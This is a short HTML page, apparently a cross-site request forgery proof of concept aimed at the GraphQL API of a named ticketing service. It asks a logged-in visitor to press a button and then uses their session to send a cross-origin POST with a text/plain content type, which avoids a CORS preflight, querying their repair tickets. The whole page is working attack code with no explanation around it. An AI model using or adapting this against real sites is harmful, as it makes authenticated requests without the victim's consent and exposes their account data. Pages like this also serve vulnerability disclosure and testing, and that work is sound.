<html>
  <body>
   
  I hope you're logged in. Press the button :)
  <br>
  <br>
    
  <input type="submit" value="Submit request" onclick="submit()">

  <script type="text/javascript">
    history.pushState('', '', '/')
    function submit() {
      var xmlhttp = new XMLHttpRequest();
      var url = "https://ap.app.helloanew.com/api/graphql";
      xmlhttp.open("POST", url);
      xmlhttp.setRequestHeader("Content-Type", "text/plain");
      var payload = JSON.stringify({"operationName":"getMyTickets","variables":{},"query":"query getMyTickets {\n  myTickets {\n    id\n    unique_id\n    status_id\n    status_updated_at\n    user_description\n    created_at\n    service_group_id\n    service_group_path\n    repair_price_created_at\n    repair_price_expires_at\n    __typename\n  }\n}\n"});
      xmlhttp.send(payload);
    };
  </script>
  </body>
</html>
